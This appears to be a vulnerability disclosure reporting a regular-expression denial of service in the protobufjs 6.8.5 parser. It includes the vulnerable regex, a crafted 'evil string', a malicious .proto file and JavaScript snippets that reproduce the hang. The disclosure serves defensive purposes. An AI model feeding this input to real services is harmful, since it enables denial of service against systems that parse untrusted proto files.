## Original Report

I would like to report a ReDoS in `protobufjs`
It allows to cause Denial of Service by trying to parse (or load) a crafted `*.proto` file.

# Module

# Vulnerability

## Vulnerability Description

ReDoS.
- regex: `/^(?:\.?[a-zA-Z_][a-zA-Z_0-9]*)+$/`
- evil string: `xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx!`
- file: https://github.com/dcodeIO/protobuf.js/blob/6.8.5/src/parse.js#L27 

## Steps To Reproduce:

proto file:

```
// awesome.proto
package awesomepackage;
syntax = "proto3";

message AwesomeMessage {
    option (my_option) = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx!;
}
```

js file:

```js
require('protobufjs').load("./awesome.proto", () => {});
```

or, just with `parse`:

```js
require('protobufjs').parse(`
package awesomepackage;
syntax = "proto3";

message AwesomeMessage {
    option (my_option) = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx!;
}
`, () => {});
```
